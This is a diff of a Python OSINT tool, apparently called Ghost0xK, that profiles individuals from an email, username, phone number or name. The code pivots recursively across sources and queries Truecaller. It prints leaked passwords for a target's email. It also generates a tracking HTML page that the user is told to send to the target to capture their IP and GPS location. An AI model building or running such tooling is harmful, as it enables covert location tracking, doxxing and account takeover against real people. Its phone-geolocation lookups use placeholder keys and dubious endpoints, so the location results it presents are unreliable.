+    r"\d+%\|", r"\s*\[[-]\]\s", r"Update available", r"github\.com/sherlock-project",
+    r"You can run search", r"Too many errors", r"You can see detailed",
+    r"Available, Taken", r"Completed \d+ queries", r"QueryError", r"ClientConnector",
+    r"ConnectionTimeout", r"SSLCertVerif", r"Using sites database",
+    r"Starting a search on top", r"\[\*\] Checking username",
+    r"image:\s*https?://", r"it/s\]", r"Some characters could not",
+    r"Target factory started", r"scylla\.so is down", r"\[~\]",
+    r"websites checked in", r"\*{6,}", r"\[x\]\s", r"\[\?\]\s",
+    r"\[\*\] scanning username", r"scanner\(s\) succeeded",
+    r"Running scan for phone", r"Results for googlesearch",
+    r"Results for local", r"^\s*Raw local:", r"BTC Donations",
+    r"Heartfelt", r"Official h8mail", r"Removing duplicates",
+    r"^\[!\]", r"^\[-\]",
+]
+
+_NOISE_RE = re.compile("|".join(f"({p})" for p in _NOISE_PATTERNS))
+
+def filter_noise(text, target=""):
+    out = []
+    for ln in text.splitlines():
+        ln = _ANSI_STRIP.sub("", ln).rstrip()
+        if not ln.strip() or _NOISE_RE.search(ln):
+            continue
+        out.append(ln)
+    return out
+
+#  Auto Target Detection 
+_PAT_EMAIL_RE    = re.compile(r"^[\w.+\-]+@[\w.\-]+\.[a-zA-Z]{2,}$")
+_PAT_PHONE_RE    = re.compile(r"^(?:\+[\d\s\-()]{7,20}|(?:0|62)\d{7,13})$")
+_PAT_USERNAME_RE = re.compile(r"^[a-zA-Z0-9_.\-]{2,50}$")
+
+def detect_target_type(s):
+    s = s.strip()
+    if _PAT_EMAIL_RE.match(s):
+        return "email"
+    if _PAT_PHONE_RE.match(s):
+        return "phone"
+    if " " in s:
+        return "name"
+    if _PAT_USERNAME_RE.match(s):
+        return "username"
+    return "username"
+
+def sanitize_target(s):
+    s = s.strip()
+    if not s:
+        raise ValueError("target is empty")
+    if len(s) > 200:
+        raise ValueError("target is too long")
+    bad = re.search(r'[;&|`$\n\r<>()\[\]{}\\\'\"#^~*!]', s)
+    if bad:
+        raise ValueError("invalid characters in target")
+    return s
+
+#  Entity Extraction with Confidence 
+def extract_entities(output, module_name):
+    findings = []
+    for line in output.splitlines():
+        ln = line.strip()
+        if not ln:
+            continue
+        conf = score_confidence(module_name, ln)
+        if conf == CONF_NOISE:
+            continue
+        for m in re.findall(r'\b[\w.+\-]{2,}@[\w.\-]+\.[a-zA-Z]{2,}\b', ln):
+            if "noreply" not in m and "example" not in m:
+                findings.append(("email", m.lower(), conf))
+        for m in re.findall(r'\+\d[\d\s\-]{6,15}\d', ln):
+            findings.append(("phone", m.strip(), conf))
+        um = re.search(r'username\s*[:\-]\s*([a-zA-Z0-9_.\-]{2,40})', ln, re.I)
+        if um:
+            findings.append(("username", um.group(1).strip(), conf))
+        nm = re.search(r'(?:name|full_name|display_name)\s*[:\-]\s*(.{3,60})', ln, re.I)
+        if nm:
+            val = nm.group(1).strip().strip('"\'')
+            if len(val) > 2 and val.lower() not in ("-", "none", "null"):
+                findings.append(("name", val, conf))
+    return findings
+
+#  Deduplication & Merging 
+def _normalize_value(category, value):
+    v = value.strip()
+    if category == "email":    return v.lower()
+    if category == "phone":    return re.sub(r"[\s\-()]", "", v)
+    if category == "username": return v.lower()
+    if category == "name":     return v.lower()
+    return v.lower()
+
+def merge_into_profile(profile, category, value, confidence, source_module, source_target):
+    key = f"{category}:{_normalize_value(category, value)}"
+    if key not in profile:
+        profile[key] = {
+            "category": category, "value": value,
+            "confidence": confidence, "sources": [],
+        }
+    else:
+        existing_rank = _CONF_RANK.get(profile[key]["confidence"], 0)
+        new_rank = _CONF_RANK.get(confidence, 0)
+        if new_rank > existing_rank:
+            profile[key]["confidence"] = confidence
+    src = f"{source_module}@{source_target}"
+    if src not in profile[key]["sources"]:
+        profile[key]["sources"].append(src)
+
+def build_pivot_queue(inv_data, already_investigated):
+    new_pivots = []
+    for r in inv_data.get("results", []):
+        if not r.get("ok"):
+            continue
+        entities = extract_entities(r.get("output", ""), r["module"])
+        for cat, val, conf in entities:
+            if conf == CONF_NOISE:
+                continue
+            if val not in already_investigated:
+                new_pivots.append((val, cat))
+    return new_pivots[:6]
+
+
+def smart_osint():
+    """SMOS — Smart OSINT: استقصاء متعدد المستويات مع اكتشاف تلقائي"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} SMOS — SMART OSINT INVESTIGATION")
+    print(f" {Wh}{'='*55}")
+    print(f"{Y}[!] Multi-level recursive pivot · Confidence scoring · Profile builder{Wh}")
+
+    target = input(f"\n{Wh}[+] Target {Gr}[email, username, phone, name]{Wh}: {Gr}").strip()
+    if not target:
+        return
+    try:
+        target = sanitize_target(target)
+    except ValueError as e:
+        print(f"{R}[!] {e}{Wh}")
+        input(f"[+] Press Enter")
+        return
+
+    ttype = detect_target_type(target)
+    print(f"{Wh}  Detected type: {Gr}{ttype}{Wh}")
+
+    max_depth = input(f"{Wh}[+] Max depth {Gr}[0-2, default=1]{Wh}: {Gr}").strip()
+    max_depth = int(max_depth) if max_depth.isdigit() else 1
+    max_depth = min(max_depth, 2)
+
+    investigated = {}
+    pivot_graph = {}
+    unified_profile = {}
+    queue = [(target, ttype, 0)]
+
+    print(f"\n{Y}[*] Starting SMOS investigation...{Wh}")
+    start_time = time.time()
+
+    while queue and len(investigated) < 12:
+        current, ctype, depth = queue.pop(0)
+        if current in investigated:
+            continue
+
+        print(f"\n{Wh}[{Gr}>{Wh}] Investigating {Gr}{current}{Wh} ({ctype}) [depth {depth}]")
+        investigated[current] = {"type": ctype, "results": [], "depth": depth}
+
+        if ctype == "email":
+            node = investigate_email_agentic(current, depth)
+            r = {"ok": True, "module": "agentic_email", "output": str(node.findings)}
+            investigated[current]["results"].append(r)
+            for cat, val in [("username", current.split("@")[0])]:
+                merge_into_profile(unified_profile, cat, val, CONF_MEDIUM,
+                                   "agentic_email", current)
+            for child in node.children:
+                merge_into_profile(unified_profile, child.data_type, child.value,
+                                   CONF_MEDIUM, "agentic_email_child", current)
+            if node.findings.get("breaches"):
+                merge_into_profile(unified_profile, "breach",
+                                   str(node.findings["breaches"]), CONF_HIGH,
+                                   "hibp", current)
+        elif ctype == "username":
+            node = investigate_username_agentic(current, depth)
+            r = {"ok": True, "module": "agentic_username", "output": str(node.findings)}
+            investigated[current]["results"].append(r)
+            merge_into_profile(unified_profile, "username", current, CONF_MEDIUM,
+                               "agentic_username", current)
+            for child in node.children:
+                merge_into_profile(unified_profile, child.data_type, child.value,
+                                   CONF_HIGH, "agentic_username_child", current)
+        elif ctype == "phone":
+            try:
+                ultra_data = {"carrier": "see PhoneTracker"}
+                merge_into_profile(unified_profile, "phone", current, CONF_HIGH,
+                                   "phone_check", current)
+            except:
+                pass
+        elif ctype == "name":
+            wiki = search_wikipedia(current)
+            if wiki["found"]:
+                merge_into_profile(unified_profile, "name", current, CONF_HIGH,
+                                   "wikipedia", current)
+
+        if depth < max_depth:
+            new_pivots = build_pivot_queue(investigated[current],
+                                           set(investigated.keys()))
+            pivot_graph[current] = [t for t, _ in new_pivots]
+            for pt, ptype in new_pivots:
+                if pt not in investigated:
+                    queue.append((pt, ptype, depth + 1))
+
+    elapsed = time.time() - start_time
+
+    print(f"\n{Wh} SMOS REPORT ")
+    print(f"{Wh} Seed          : {C}{target}")
+    print(f"{Wh} Type          : {Gr}{ttype}")
+    print(f"{Wh} Targets       : {Gr}{len(investigated)}")
+    print(f"{Wh} Duration      : {Gr}{elapsed:.1f}s")
+    print(f"{Wh} Pivot chains  : {Gr}{len(pivot_graph)}{Wh}")
+
+    if unified_profile:
+        print(f"\n{Gr} UNIFIED PROFILE:{Wh}")
+        ordered = sorted(unified_profile.items(),
+                         key=lambda x: _CONF_RANK.get(x[1]["confidence"], 0),
+                         reverse=True)
+        for key, entry in ordered[:15]:
+            icon = {"email": "", "phone": "", "username": "",
+                    "name": "", "breach": ""}.get(entry["category"], "•")
+            conf_color = {CONF_HIGH: Gr, CONF_MEDIUM: Y, CONF_LOW: R}.get(entry["confidence"], Wh)
+            print(f"  {icon} {conf_color}{entry['value']}{Wh} [{conf_color}{entry['confidence']}{Wh}]")
+
+    result_data = {
+        "mode": "smos",
+        "seed": target,
+        "seed_type": ttype,
+        "targets_scanned": len(investigated),
+        "profile": unified_profile,
+        "pivot_graph": pivot_graph,
+    }
+    result = ScanResult(
+        timestamp=datetime.now().isoformat(),
+        scan_type="smos",
+        target=target,
+        data=result_data
+    )
+    save_report(result)
+    print(f"\n{Gr}[] SMOS report saved{Wh}")
+
+    input(f"\n{Wh}[+] Press Enter")
+
+
+#  Folium Map Generator 
+def generate_location_map(lat: float, lon: float, label: str, output_file: str = "location_map.html") -> str:
+    """إنشاء خريطة تفاعلية للموقع"""
+    try:
+        import folium
+        m = folium.Map(location=[lat, lon], zoom_start=14)
+        folium.Marker([lat, lon], popup=label, tooltip=label,
+                      icon=folium.Icon(color='red', icon='phone', prefix='fa')).add_to(m)
+        filepath = Path(CONFIG["output_dir"]) / output_file
+        m.save(str(filepath))
+        return str(filepath)
+    except ImportError:
+        return "Install folium: pip install folium"
+    except:
+        return "Map generation failed"
+
+
+#  PhoneGW_Ultra — النسخة المتطورة 
+def phoneGW_Ultra():
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} PHONETRACKER PRO v5.0 — ULTRA")
+    print(f" {Wh}{'='*55}")
+    print(f"{Y}[!] Consensus voting · Truecaller 3x · IP Grabber · Evidence chain{Wh}")
+
+    user_input = input(f"\n{Wh}[+] Phone number {Gr}[with country code]{Wh}: {Gr}").strip()
+    if not user_input:
+        return
+
+    if user_input.startswith('+'):
+        user_phone = user_input
+    else:
+        for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
+            if user_input.startswith(code):
+                user_phone = f"+{user_input}"
+                break
+        else:
+            user_phone = user_input
+
+    user_phone = re.sub(r'[^\d+]', '', user_phone)
+    if not validate_phone(user_phone):
+        print(f"{R}[!] Invalid phone number format!")
+        input(f"\n{Wh}[+] Press Enter")
+        return
+
+    clean_digits = re.sub(r'\D', '', user_phone)
+    cc = ""
+    for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
+        if user_phone.startswith(f"+{code}"):
+            cc = code
+            break
+
+    # سلسلة حفظ الأدلة
+    chain = ChainOfCustody(f"PHONE-{clean_digits[:6]}", "Ghost0xK_Operator")
+    chain.log_evidence("Scan started", f"Phone: {user_phone}, Country Code: {cc}")
+
+    print(f"\n{Y}[*] Phase 1 — Multi-API Location Consensus{Wh}")
+
+    voter = LocationConsensusVoter()
+    location_sources = []
+
+    # 8 APIs للموقع
+    api_list = [
+        ("ipapi", f"https://ipapi.com/ip_api.php?phone={clean_digits}", 0.7),
+        ("ipdata", f"https://api.ipdata.co/phone/{clean_digits}?api-key=test", 0.6),
+        ("abstract", f"https://phonevalidation.abstractapi.com/v1/?phone={clean_digits}&api_key=test", 0.6),
+        ("numverify", f"http://apilayer.net/api/validate?access_key=&number={clean_digits}", 0.5),
+        ("veriphone", f"https://api.veriphone.io/v2/verify?phone={clean_digits}&key=test", 0.6),
+        ("ipwhois", f"https://ipwhois.io/phone/{clean_digits}", 0.5),
+        ("findandtrace", f"https://www.findandtrace.com/trace-mobile-number?number={clean_digits}", 0.4),
+        ("mobiletracker", f"https://www.mobiletracker.net/api/lookup?number={clean_digits}", 0.4),
+    ]
+
+    for name, url, conf in api_list:
+        try:
+            resp = requests.get(url, timeout=6, headers={"User-Agent": random.choice(CONFIG["user_agents"])})
+            if resp.status_code == 200:
+                data = resp.json() if resp.text.startswith("{") else {}
+                city = data.get("city") or data.get("location") or data.get("country_name") or ""
+                if city:
+                    voter.add_vote(city, name, conf)
+                    location_sources.append(name)
+                    print(f"  {Gr}{Wh} {name:<15}: {city}")
+        except:
+            pass
+
+    consensus = voter.consensus_vote()
+    if consensus:
+        print(f"\n  {C}Consensus: {Gr}{consensus['city']}{Wh} ({consensus['confidence']*100:.0f}% confidence, {consensus['votes']})")
+        chain.log_evidence("Consensus vote", f"City: {consensus['city']}, Confidence: {consensus['confidence']}")
+    else:
+        print(f"  {Y}No location data available{Wh}")
+
+    print(f"\n{Y}[*] Phase 2 — Truecaller Triple Probe{Wh}")
+    tc = TruecallerProbe()
+    tc_result = tc.search_truecaller(user_phone, cc, clean_digits)
+    if tc_result.get("found"):
+        print(f"  {Gr}{Wh} Name : {Gr}{tc_result['name']}{Wh}")
+        if tc_result.get("email"):
+            print(f"  {Gr}{Wh} Email: {Gr}{tc_result['email']}{Wh}")
+        print(f"  {Y}  Method: {tc_result['method']}{Wh}")
+        chain.log_evidence("Truecaller hit", f"Name: {tc_result['name']}, Method: {tc_result['method']}")
+    else:
+        print(f"  {Y}No Truecaller data found{Wh}")
+
+    print(f"\n{Y}[*] Phase 3 — IP Grabber & GPS Tracker{Wh}")
+    ipg = IPGrabber()
+    track_id = uuid.uuid4().hex[:8]
+    tracking_html = ipg.generate_tracking_page(user_phone, track_id)
+    html_path = Path(CONFIG["output_dir"]) / f"tracker_{track_id}.html"
+    html_path.write_text(tracking_html, encoding="utf-8")
+    print(f"  {C}Tracking page: {Gr}{html_path}{Wh}")
+    print(f"  {Y}Send this file to target or host on a server{Wh}")
+    chain.log_evidence("IP Grabber created", f"Track ID: {track_id}, File: {html_path}")
+
+    print(f"\n{Y}[*] Phase 4 — Wikipedia Entity Lookup{Wh}")
+    entity_name = tc_result.get("name", "") if tc_result.get("found") else ""
+    if not entity_name:
+        search_term = input(f"  {Wh}[+] Enter name/person to search {Gr}[or Enter to skip]{Wh}: {Gr}").strip()
+        if search_term:
+            entity_name = search_term
+    if entity_name:
+        wiki = search_wikipedia(entity_name)
+        if wiki["found"]:
+            print(f"  {Gr}{Wh} Wikipedia: {C}{wiki['url']}{Wh}")
+            print(f"  {Y}  {wiki['summary'][:200]}...{Wh}")
+            chain.log_evidence("Wikipedia lookup", f"Entity: {wiki['title']}")
+        else:
+            print(f"  {Y}No Wikipedia entry found{Wh}")
+
+    print(f"\n{Y}[*] Phase 5 — Evidence Chain & Report{Wh}")
+    chain.log_evidence("Scan completed", f"Sources: {', '.join(location_sources) if location_sources else 'basic'}")
+    custody_report = chain.generate_custody_report()
+
+    # Map generation if GPS found
+    map_file = None
+    if consensus:
+        lat_lon = None
+        if isinstance(consensus.get("city"), str):
+            try:
+                geo_resp = requests.get(
+                    f"https://nominatim.openstreetmap.org/search?q={consensus['city']}&format=json&limit=1",
+                    headers={"User-Agent": "Ghost0xK/1.0"}, timeout=8
+                )
+                if geo_resp.status_code == 200:
+                    geo_data = geo_resp.json()
+                    if geo_data:
+                        lat_lon = (float(geo_data[0]["lat"]), float(geo_data[0]["lon"]))
+            except:
+                pass
+        if lat_lon:
+            map_file = generate_location_map(lat_lon[0], lat_lon[1], consensus["city"])
+            if map_file and "Error" not in map_file and "Install" not in map_file:
+                print(f"  {C}Map: {Gr}{map_file}{Wh}")
+
+    print(f"\n{C}{custody_report}{Wh}")
+
+    # Final result
+    final_data = {
+        "phone": user_phone,
+        "country_code": cc,
+        "location_consensus": consensus,
+        "truecaller": tc_result,
+        "tracking_page": str(html_path),
+        "chain_of_custody": chain.evidence_chain,
+    }
+    result = ScanResult(
+        timestamp=datetime.now().isoformat(),
+        scan_type="phone_ultra",
+        target=user_phone,
+        data=final_data
+    )
+    save_report(result)
+    print(f"{Gr}[] Full report saved{Wh}")
+
+    input(f"\n{Wh}[+] Press Enter")
+
+
+def phoneGW():
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}📱 PHONE NUMBER TRACKER (ENHANCED)")
+    print(f" {R} PHONE NUMBER TRACKER (ENHANCED)")
     print(f" {Wh}{'='*50}")
     
     print(f"{Wh}[?] Enter phone number {Gr}[with country code, e.g., +212612345678]{Wh}")
@@ -2720,7 +4149,7 @@ def phoneGW_Enhanced():
         return
     
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}📊 PHONE NUMBER INFORMATION")
+    print(f" {R} PHONE NUMBER INFORMATION")
     print(f" {Wh}{'='*50}")
     
     try:
@@ -2805,7 +4234,7 @@ def phoneGW_Enhanced():
             data['ReverseLookup'] = reverse_info
         
         print(f"\n {Wh}{'='*50}")
-        print(f" {R}🔗 MESSAGING DIRECT LINKS")
+        print(f" {R} MESSAGING DIRECT LINKS")
         print(f" {Wh}{'='*50}")
         
         clean_number = re.sub(r'[^\d+]', '', user_phone)
@@ -2819,7 +4248,7 @@ def phoneGW_Enhanced():
         print(f"{Wh} Viber          : {C}viber://chat?number={clean_digits}{RS}")
         
         print(f"\n {Wh}{'='*50}")
-        print(f" {R}🌐 WEB SEARCH LINKS")
+        print(f" {R} WEB SEARCH LINKS")
         print(f" {Wh}{'='*50}")
         print(f"{Wh} Google         : {C}https://www.google.com/search?q={clean_number}{RS}")
         print(f"{Wh} Truecaller     : {C}https://www.truecaller.com/search/{clean_digits}{RS}")
@@ -2846,12 +4275,12 @@ def phoneGW_Enhanced():
     
     input(f"\n{Wh}[+{Wh}] Press Enter to continue")
 
-phoneGW = phoneGW_Enhanced
-
 
 def check_email_breaches_advanced(email: str) -> Dict:
-    """التحقق المتقدم من اختراقات البريد الإلكتروني"""
-    results = {'breaches': [], 'total_breaches': 0, 'pastes': [], 'leaked_data': {}}
+    """التحقق المتقدم من اختراقات البريد الإلكتروني (3 مصادر)"""
+    results = {'breaches': [], 'total_breaches': 0, 'pastes': [], 'leaked_data': {}, 'passwords': []}
+    
+    checker = BreachChecker()
     
     try:
         headers = {'hibp-api-key': '', 'User-Agent': 'Ghost0xK-OSINT/1.0'}
@@ -2884,6 +4313,22 @@ def check_email_breaches_advanced(email: str) -> Dict:
             pastes = data.get('data', [])
             results['pastes'] = [{'id': p['id'], 'title': p.get('title', 'No title')[:50]} for p in pastes[:10]]
     except: pass
+    
+    print(f"{Y}[*] Checking Hudson Rock database...{Wh}")
+    hudson = checker.check_hudsonrock(email)
+    if hudson:
+        results['total_breaches'] += 1
+        results['leaked_data']['HudsonRock'] = {'source': 'Infostealer Malware', 'found': True}
+        print(f"    {R}[!] Email associated with infected computer (Hudson Rock){Wh}")
+    
+    print(f"{Y}[*] Checking ProxyNova leak database...{Wh}")
+    proxynova = checker.check_proxynova(email)
+    if proxynova:
+        results['passwords'] = proxynova[:5]
+        results['leaked_data']['ProxyNova'] = {'passwords_found': len(proxynova)}
+        print(f"    {R}[!] Found {len(proxynova)} leaked passwords via ProxyNova{Wh}")
+        for pwd in proxynova[:3]:
+            print(f"    {R}    - {pwd}{Wh}")
     
     return results
 
@@ -2994,7 +4439,7 @@ def get_email_social_profiles(email: str) -> Dict:
 def display_email_summary(email: str, data: Dict):
     """عرض ملخص البريد في التيرمينال"""
     print(f"\n {Wh}{'='*50}")
-    print(f" {Gr}📧 EMAIL INVESTIGATION SUMMARY")
+    print(f" {Gr} EMAIL INVESTIGATION SUMMARY")
     print(f" {Wh}{'='*50}")
     print(f"{Wh} Email           : {Gr}{email}")
     print(f"{Wh} Domain          : {Gr}{email.split('@')[1]}")
@@ -3009,9 +4454,7 @@ def display_email_summary(email: str, data: Dict):
     if data.get('GitHub', {}).get('repos'):
         print(f"{Wh} GitHub Ref      : {Gr}{len(data['GitHub']['repos'])} references")
 
-original_email_osint = email_osint
-
-def email_osint_Enhanced():
+def email_osint():
     email = input(f"\n{Wh}[?] Enter email address {Gr}[e.g., user@example.com]{Wh}: {Gr}").strip()
     if not email or '@' not in email:
         print(f"{R}[!] Invalid email address!")
@@ -3019,7 +4462,7 @@ def email_osint_Enhanced():
         return
     
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}📧 EMAIL OSINT INVESTIGATION (ENHANCED)")
+    print(f" {R} EMAIL OSINT INVESTIGATION (ENHANCED)")
     print(f" {Wh}{'='*50}")
     
     domain = email.split('@')[1]
@@ -3096,8 +4539,6 @@ def email_osint_Enhanced():
     )
     save_report(result)
     input(f"\n{Wh}[+{Wh}] Press Enter to continue")
-
-email_osint = email_osint_Enhanced
 
 
 EXTRA_PLATFORMS = [
@@ -3215,8 +4656,9 @@ def get_username_avatar(username: str, platform: str) -> str:
     return avatar_urls.get(platform, '')
 
 
-def TrackLu_Enhanced():
-    username = input(f"\n{Wh}[?] Enter username to track {Gr}[e.g., john_doe]{Wh}: {Gr}").strip()
+def TrackLu_Enhanced(username=None):
+    if not username:
+        username = input(f"\n{Wh}[?] Enter username to track {Gr}[e.g., john_doe]{Wh}: {Gr}").strip()
     if not username:
         print(f"{R}[!] Username cannot be empty!")
         input(f"\n{Wh}[+{Wh}] Press Enter to continue")
@@ -3273,7 +4715,7 @@ def TrackLu_Enhanced():
     ]
     
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}👤 RATED USERNAME TRACKING (0-100)")
+    print(f" {R} RATED USERNAME TRACKING (0-100)")
     print(f" {Wh}{'='*50}")
     print(f"{Y}[*] Searching {len(all_platforms)} platforms with confidence scoring...")
     print(f"{Y}[*] Score legend: 85+ VERY HIGH | 70+ HIGH | 45+ MEDIUM | 20+ LOW | <20 NONE{Wh}")
@@ -3296,7 +4738,7 @@ def TrackLu_Enhanced():
                 print(f"\r{Y}[*] Progress: {progress}% | Found: {found_count}", end="", flush=True)
     
     print(f"\n\n {Wh}{'='*50}")
-    print(f" {R}📊 RESULTS WITH CONFIDENCE SCORES")
+    print(f" {R} RESULTS WITH CONFIDENCE SCORES")
     print(f" {Wh}{'='*50}")
     
     scored_results = []
@@ -3351,7 +4793,69 @@ def TrackLu_Enhanced():
     save_report(result, ["json", "txt", "csv"])
     input(f"\n{Wh}[+{Wh}] Press Enter to continue")
 
-TrackLu = TrackLu_Enhanced
+
+def TrackLu_Super(username=None):
+    if not username:
+        username = input(f"\n{Wh}[?] Enter username {Gr}[e.g., john_doe]{Wh}: {Gr}").strip()
+    if not username:
+        print(f"{R}[!] Username cannot be empty!")
+        input(f"\n{Wh}[+{Wh}] Press Enter")
+        return
+
+    print(f"\n{Y}[*] Initializing WhatsMyName Super Engine...{Wh}")
+    engine = WhatsMyNameEngine()
+    stats = engine.get_stats()
+    print(f"{Gr}[+] Loaded {stats['total_sites']} sites across {len(stats['categories'])} categories{Wh}")
+    print(f"{Gr}[+] POST support: {stats['has_post_support']} sites | Protected: {stats['has_protection']}{Wh}")
+
+    print(f"\n{Y}[*] Filter options:{Wh}")
+    print(f"  1. All sites ({stats['total_sites']})")
+    print(f"  2. Social media only")
+    print(f"  3. Coding/tech sites")
+    print(f"  4. Custom filter")
+
+    choice = input(f"\n{Wh}[?] Choose filter {Gr}[1-4]{Wh}: {Gr}").strip()
+    categories = None
+    if choice == "2":
+        categories = ["social"]
+    elif choice == "3":
+        categories = ["coding", "tech"]
+    elif choice == "4":
+        all_cats = engine.get_categories()
+        print(f"\n{Y}Available categories: {', '.join(all_cats)}{Wh}")
+        cat_input = input(f"{Wh}[?] Enter categories (comma separated): {Gr}").strip()
+        categories = [c.strip() for c in cat_input.split(",") if c.strip()]
+
+    print(f"\n{Y}[*] Searching '{username}' across {stats['total_sites']} sites...{Wh}")
+    print(f"{Y}[*] This may take a moment...{Wh}\n")
+
+    results = engine.search(username, categories=categories)
+
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R}WHATSMYNAME SUPER RESULTS")
+    print(f" {Wh}{'='*55}")
+
+    print(f"\n{Gr}[+] FOUND ({len(results['found'])} sites):{Wh}")
+    for site in results['found'][:35]:
+        print(f"    {Wh} {C}{site['name']:<25}{RS} → {Gr}{site['url'][:60]}{RS}")
+    if len(results['found']) > 35:
+        print(f"    {Y}... and {len(results['found']) - 35} more")
+
+    if results['not_found']:
+        print(f"\n{Y}[-] NOT FOUND ({len(results['not_found'])} sites):{Wh}")
+        for site in results['not_found'][:10]:
+            print(f"    {Wh}• {site['name']:<25} → HTTP {site['status_code']}{RS}")
+
+    print(f"\n{Wh}[*] Summary: Found {len(results['found'])} / {results['total']} sites{RS}")
+
+    result = ScanResult(
+        timestamp=datetime.now().isoformat(),
+        scan_type="wmn_super",
+        target=username,
+        data=results
+    )
+    save_report(result)
+    input(f"\n{Wh}[+{Wh}] Press Enter")
 
 
 def get_domain_technologies(domain: str) -> Dict:
@@ -3438,6 +4942,866 @@ def get_domain_related(domain: str) -> Dict:
     return related
 
 
+# ── DNSRecon-Powered DNS Enumeration Engine ──────────────────────────
+
+SUBDOMAIN_WORDLIST = [
+    'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop3', 'admin', 'blog', 'vpn',
+    'api', 'dev', 'test', 'stage', 'staging', 'prod', 'production', 'uat', 'demo', 'beta',
+    'ns1', 'ns2', 'ns3', 'ns4', 'mx', 'mx1', 'mx2', 'mail2', 'mail3', 'imap',
+    'autodiscover', 'cpanel', 'whm', 'webdisk', 'cpcalendars', 'cpcontacts', 'webmail',
+    'server', 'remote', 'secure', 'portal', 'my', 'support', 'help', 'status', 'docs',
+    'wiki', 'git', 'svn', 'jenkins', 'jira', 'confluence', 'grafana', 'prometheus',
+    'kibana', 'elastic', 'logstash', 'splunk', 'nagios', 'zabbix', 'monitor', 'monitoring',
+    'cloud', 'cdn', 'static', 'assets', 'media', 'img', 'images', 'css', 'js', 'fonts',
+    'download', 'downloads', 'upload', 'uploads', 'files', 'file', 'storage', 'backup',
+    'proxy', 'cache', 'balancer', 'lb', 'loadbalancer', 'gw', 'gateway', 'router', 'fw',
+    'firewall', 'waf', 'ids', 'ips', 'siem', 'soc', 'honeypot', 'sinkhole', 'dns', 'dhcp',
+    'ntp', 'syslog', 'snmp', 'radius', 'ldap', 'kerberos', 'ad', 'dc', 'domaincontroller',
+    'owa', 'exchange', 'ecp', 'ews', 'mapi', 'rpc', 'activesync', 'caldav', 'carddav',
+    'lync', 'sfb', 'teams', 'zoom', 'meet', 'webex', 'gotomeeting', 'anyconnect', 'vpn',
+    'openvpn', 'ipsec', 'pptp', 'l2tp', 'sstp', 'ikev2', 'wireguard', 'ssh', 'rdp', 'vnc',
+    'telnet', 'bastion', 'jump', 'jumpbox', 'cacti', 'mrtg', 'observium', 'librenms',
+    'pve', 'proxmox', 'esxi', 'vcenter', 'vsphere', 'vcloud', 'xen', 'xenserver', 'kvm',
+    'docker', 'k8s', 'kubernetes', 'rancher', 'openshift', 'nomad', 'consul', 'vault',
+    'nexus', 'artifactory', 'registry', 'harbor', 'gitlab', 'bitbucket', 'gitea', 'gogs',
+    'grafana', 'kibana', 'logstash', 'graylog', 'papertrail', 'loggly', 'sumologic',
+    'sentry', 'rollbar', 'bugsnag', 'datadog', 'newrelic', 'appdynamics', 'dynatrace',
+    'pagerduty', 'opsgenie', 'victorops', 'slack', 'teams', 'discord', 'mattermost',
+    'rocketchat', 'zulip', 'riot', 'matrix', 'jitsi', 'bigbluebutton', 'openmeetings',
+    'moodle', 'blackboard', 'canvas', 'edmodo', 'schoology', 'classroom', 'academy',
+    'learn', 'training', 'tutorial', 'course', 'courses', 'university', 'campus',
+    'research', 'lab', 'labs', 'science', 'tech', 'technology', 'innovation', 'rnd',
+    'hr', 'humanresources', 'payroll', 'benefits', 'talent', 'recruitment', 'jobs',
+    'career', 'careers', 'apply', 'resume', 'cv', 'interview', 'onboarding',
+    'erp', 'crm', 'sales', 'marketing', 'analytics', 'reports', 'reporting', 'bi',
+    'tableau', 'powerbi', 'qlik', 'looker', 'microstrategy', 'cognos', 'businessobjects',
+    'sap', 'oracle', 'peoplesoft', 'jdedwards', 'siebel', 'salesforce', 'dynamics',
+    'hubspot', 'market', 'mailchimp', 'sendgrid', 'mandrill', 'postmark', 'ses',
+    'wordpress', 'wp', 'wp-admin', 'wp-content', 'wp-includes', 'wp-login', 'wp-json',
+    'joomla', 'drupal', 'magento', 'shopify', 'woocommerce', 'prestashop', 'opencart',
+    'phpmyadmin', 'phpadmin', 'adminer', 'pgadmin', 'sqlpad', 'titan', 'couchdb',
+    'mariadb', 'mysql', 'postgres', 'redis', 'memcached', 'mongodb', 'elasticsearch',
+    'solr', 'sphinx', 'neo4j', 'cassandra', 'couchbase', 'riak', 'cockroachdb',
+    'stream', 'live', 'tv', 'video', 'radio', 'podcast', 'channel', 'media', 'broadcast',
+    'shop', 'store', 'marketplace', 'cart', 'checkout', 'order', 'orders', 'payment',
+    'billing', 'invoice', 'invoices', 'subscription', 'subscribe', 'newsletter',
+    'news', 'blog', 'articles', 'article', 'post', 'posts', 'forum', 'community',
+    'chat', 'talk', 'message', 'messages', 'notification', 'notifications', 'alert',
+    'alerts', 'webhook', 'webhooks', 'callback', 'callback', 'endpoint', 'endpoints',
+    'mobile', 'app', 'apps', 'android', 'ios', 'iphone', 'ipad', 'mac', 'windows',
+    'linux', 'ubuntu', 'debian', 'centos', 'redhat', 'fedora', 'arch', 'alpine',
+    's3', 'bucket', 'objects', 'files', 'static', 'assets', 'media', 'uploads',
+    'test', 'tests', 'testing', 'qa', 'quality', 'qualityassurance', 'ci', 'cd',
+    'teamcity', 'bamboo', 'circleci', 'travis', 'github', 'gitlab-ci', 'jenkins',
+    'build', 'builder', 'compile', 'compiler', 'package', 'packages', 'repo', 'repository',
+    'npm', 'pypi', 'rubygems', 'crates', 'packagist', 'nuget', 'dockerhub', 'quay',
+    'registry', 'artifactory', 'nexus', 'proget', 'chocolatey', 'homebrew',
+    'zone', 'internal', 'external', 'dmz', 'intranet', 'extranet', 'partner', 'partners',
+    'vendor', 'vendors', 'supplier', 'suppliers', 'customer', 'customers', 'client',
+    'clients', 'tenant', 'tenants', 'admin', 'administrator', 'root', 'superuser',
+    'manager', 'management', 'dashboard', 'control', 'panel', 'console',
+]
+
+SRV_SERVICES = [
+    '_sip._tcp', '_sip._udp', '_sips._tcp',
+    '_h323cs._tcp', '_h323cs._udp', '_h323ls._tcp', '_h323ls._udp',
+    '_sipinternal._tcp', '_sipinternaltls._tcp',
